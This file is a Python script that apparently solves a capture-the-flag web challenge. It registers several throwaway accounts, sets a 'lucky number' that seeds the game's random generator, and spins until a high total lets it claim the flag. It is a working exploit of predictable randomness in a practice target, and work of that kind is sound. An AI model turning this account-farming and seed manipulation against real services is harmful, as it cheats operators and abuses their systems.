import requests, sys, re, time, random
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

# Don't brute force - just set lucky number to make PRNG give high values
# Let's analyze the PRNG pattern

base = 'https://web-random-cheese.tracebash.xyz'

# Wait for rate limit
print('Waiting 30s...')
time.sleep(30)

# Create a few accounts to test different seeds in parallel-ish
results = {}
for seed in [42, 69, 123, 256, 333, 444, 555, 666, 777, 888]:
    s = requests.Session()
    name = f'h{seed}'
    r1 = s.post(f'{base}/register', data={'username': name, 'password': name})
    r2 = s.post(f'{base}/login', data={'username': name, 'password': name})
    r3 = s.post(f'{base}/update_lucky', data={'lucky_number': str(seed)})
    if r3.status_code == 429:
        print(f'Seed {seed}: rate limited')
        continue
    
    vals = []
    for i in range(10):
        r = s.post(f'{base}/spin')
        try:
            j = r.json()
            vals.append(j['val'])
        except:
            break
    
    total = sum(vals)
    print(f'Seed {seed}: total={total}, vals={vals}')
    if total >= 85:
        print(f'\n*** WINNING SEED: {seed} with total={total} ***')
        # Claim
        r = s.post(f'{base}/claim')
        print(f'Claim response: {r.text[:1000]}')
        # Extract flag
        flags = re.findall(r'[A-Z]{3,}\{[^}]+\}', r.text)
        for f in flags:
            if 'deg' not in f and 'MATCH' not in f:
                print(f'FLAG: {f}')
        break
    time.sleep(3)  # Be nice to the server